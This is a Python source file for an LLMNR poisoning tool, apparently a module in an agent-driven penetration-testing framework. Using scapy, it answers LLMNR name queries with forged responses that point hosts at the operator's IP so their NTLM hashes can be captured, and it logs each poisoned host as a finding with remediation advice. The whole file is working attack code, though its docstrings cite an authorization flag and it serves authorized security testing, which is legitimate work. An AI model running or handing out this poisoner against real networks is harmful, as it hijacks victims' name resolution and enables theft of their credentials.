"""LLMNR/NBT-NS Poisoner Tool.

Active poisoning tool that responds to LLMNR/NBT-NS broadcast queries
with the attacker's IP address, causing victims to send NTLM
authentication to the attacker for hash capture.

Authorization: active (actively manipulates network traffic).
"""

import logging
import socket
import struct
import threading
from tools.base import BaseTool

logger = logging.getLogger(__name__)

try:
    from scapy.all import (
        sniff,
        send,
        IP,
        UDP,
        Raw,
        conf,
        get_if_addr,
    )

    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

LLMNR_PORT = 5355
LLMNR_MCAST = "224.0.0.252"
NBTNS_PORT = 137


class LLMNRPoisonerTool(BaseTool):
    def __init__(self):
        super().__init__()

    @property
    def name(self) -> str:
        return "llmnr_poisoner"

    @property
    def description(self) -> str:
        return (
            "Active LLMNR/NBT-NS poisoning: responds to broadcast name "
            "resolution queries with attacker IP to capture NTLM hashes. "
            "Requires --i-have-written-authorization flag."
        )

    @property
    def parameters(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "interface": {
                    "type": "string",
                    "description": "Network interface to use (default: auto-detect)",
                },
                "timeout": {
                    "type": "integer",
                    "description": "Poisoning duration in seconds (default: 60)",
                },
                "target_ip": {
                    "type": "string",
                    "description": "Only respond to queries from this specific IP (default: all)",
                },
            },
            "required": [],
        }

    @property
    def authorization_level(self) -> str:
        return "active"

    @property
    def category(self) -> str:
        return "poison"

    @property
    def target_fields(self) -> list:
        return ["interface", "target_ip"]

    def execute(
        self, interface: str = "auto", timeout: int = 60, target_ip: str = "all"
    ) -> str:
        # Type guards
        if not isinstance(interface, str):
            return f"Validation error: interface must be string, got {type(interface).__name__}"
        if not isinstance(timeout, (int, float)):
            return f"Validation error: timeout must be integer, got {type(timeout).__name__}"
        if not isinstance(target_ip, str):
            return f"Validation error: target_ip must be string, got {type(target_ip).__name__}"

        timeout = int(timeout)
        if timeout < 1 or timeout > 600:
            return "Validation error: timeout must be between 1 and 600 seconds"

        # Dependency check
        if not HAS_SCAPY:
            return "Error: scapy not installed. Install with: pip install scapy"

        # Auto-detect interface and get local IP
        if interface == "auto":
            interface = conf.iface
            if not interface:
                return "Error: Could not auto-detect network interface"

        try:
            local_ip = get_if_addr(interface)
        except Exception:
            local_ip = None

        if not local_ip or local_ip == "0.0.0.0":
            return f"Error: Could not determine IP address for interface {interface}"

        # Tracking
        poisoned = {}  # src_ip -> {query_name: count}
        lock = threading.Lock()
        stop_event = threading.Event()

        def _build_llmnr_response(pkt, query_name, transaction_id):
            """Build LLMNR response packet pointing to our IP."""
            # LLMNR response: transaction_id, flags=0x8000, questions=1, answers=1
            name_encoded = b""
            for char in query_name:
                name_encoded += bytes([len(char.encode())]) + char.encode()
            name_encoded += b"\x00"

            response = struct.pack(">H", transaction_id)  # Transaction ID
            response += struct.pack(">H", 0x8000)  # Flags: response
            response += struct.pack(">H", 1)  # Questions
            response += struct.pack(">H", 1)  # Answers
            response += struct.pack(">H", 0)  # Authority
            response += struct.pack(">H", 0)  # Additional

            # Question section
            response += name_encoded
            response += struct.pack(">H", 1)  # Type A
            response += struct.pack(">H", 1)  # Class IN

            # Answer section
            response += name_encoded
            response += struct.pack(">H", 1)  # Type A
            response += struct.pack(">H", 1)  # Class IN
            response += struct.pack(">I", 30)  # TTL
            response += struct.pack(">H", 4)  # Data length
            response += socket.inet_aton(local_ip)  # Our IP

            return response

        def _parse_llmnr_query(data):
            """Parse LLMNR query and extract name."""
            if len(data) < 12:
                return None, None
            transaction_id = struct.unpack(">H", data[0:2])[0]
            flags = struct.unpack(">H", data[2:4])[0]

            # Only handle queries (flags bit 15 = 0)
            if flags & 0x8000:
                return None, None

            # Parse name from question section
            offset = 12
            name_parts = []
            while offset < len(data):
                length = data[offset]
                if length == 0:
                    break
                offset += 1
                if offset + length > len(data):
                    break
                name_parts.append(
                    data[offset : offset + length].decode("utf-8", errors="replace")
                )
                offset += length

            query_name = ".".join(name_parts) if name_parts else None
            return transaction_id, query_name

        def packet_handler(pkt):
            if stop_event.is_set():
                return
            if not pkt.haslayer(IP) or not pkt.haslayer(UDP):
                return

            src_ip = pkt[IP].src
            dst_port = pkt[UDP].dport

            # Skip our own traffic
            if src_ip == local_ip:
                return

            # Target filtering
            if target_ip != "all" and src_ip != target_ip:
                return

            if dst_port == LLMNR_PORT and pkt.haslayer(Raw):
                raw_data = bytes(pkt[Raw].load)
                transaction_id, query_name = _parse_llmnr_query(raw_data)

                if query_name and transaction_id is not None:
                    # Build and send response
                    response_data = _build_llmnr_response(
                        pkt, query_name, transaction_id
                    )

                    response_pkt = (
                        IP(dst=src_ip, src=local_ip)
                        / UDP(sport=LLMNR_PORT, dport=pkt[UDP].sport)
                        / Raw(load=response_data)
                    )

                    try:
                        send(response_pkt, verbose=False, iface=interface)

                        with lock:
                            if src_ip not in poisoned:
                                poisoned[src_ip] = {}
                            poisoned[src_ip][query_name] = (
                                poisoned[src_ip].get(query_name, 0) + 1
                            )

                        logger.info(
                            f"LLMNR poisoned: {src_ip} queried '{query_name}' -> {local_ip}"
                        )
                    except Exception as e:
                        logger.warning(f"Failed to send LLMNR response: {e}")

        # Thread exception propagation
        thread_error = [None]

        def _sniff_wrapper():
            try:
                sniff(
                    iface=interface,
                    filter=bpf_filter,
                    prn=packet_handler,
                    timeout=timeout,
                    store=False,
                    stop_filter=lambda _: stop_event.is_set(),
                )
            except Exception as e:
                thread_error[0] = e

        try:
            # Start sniffing in a thread
            bpf_filter = f"udp port {LLMNR_PORT}"

            sniff_thread = threading.Thread(
                target=_sniff_wrapper,
                daemon=True,
            )
            sniff_thread.start()

            # Wait for timeout
            sniff_thread.join(timeout=timeout + 5)
            stop_event.set()

            # Propagate thread exceptions
            if thread_error[0] is not None:
                raise thread_error[0]

        except PermissionError:
            return (
                "Error: Insufficient permissions for packet capture/injection. "
                "Run with root/CAP_NET_RAW: docker run --cap-add NET_RAW --cap-add NET_ADMIN ..."
            )
        except OSError as e:
            return f"Error: Network interface error: {e}"
        except Exception as e:
            return f"Error: Poisoning failed: {e}"

        # Build output
        lines = [
            "[LLMNR Poisoner]",
            f"[Interface: {interface}]",
            f"[Attacker IP: {local_ip}]",
            f"[Duration: {timeout}s]",
            f"[Target Filter: {target_ip}]",
            "",
        ]

        if not poisoned:
            lines.append("No LLMNR queries intercepted during the capture period.")
            lines.append("Tip: Ensure the target network has LLMNR-enabled clients.")
            return "\n".join(lines)

        total_responses = sum(sum(queries.values()) for queries in poisoned.values())

        lines.append(
            f"Poisoned {len(poisoned)} host(s) with {total_responses} response(s):"
        )
        lines.append("")

        for src_ip, queries in sorted(poisoned.items()):
            lines.append(f"  {src_ip}:")
            for query_name, count in sorted(queries.items()):
                lines.append(f"    '{query_name}' - {count} response(s) sent")

            self.report_finding(
                severity="critical",
                title=f"LLMNR poisoning successful: {src_ip}",
                host=src_ip,
                port=LLMNR_PORT,
                protocol="udp",
                description=(
                    f"Successfully poisoned LLMNR queries from {src_ip}. "
                    f"Queries intercepted: {', '.join(queries.keys())}. "
                    f"Victim was redirected to attacker IP {local_ip}."
                ),
                remediation=(
                    "Disable LLMNR via Group Policy: Computer Configuration > "
                    "Administrative Templates > Network > DNS Client > "
                    "Turn off Multicast Name Resolution = Enabled"
                ),
            )

        lines.append("")
        lines.append(
            f"Total: {len(poisoned)} host(s), {total_responses} poisoned response(s)"
        )
        lines.append(
            "Note: Captured NTLM hashes (if any) would appear in a separate "
            "hash capture tool. This tool only performs the poisoning."
        )

        return "\n".join(lines)
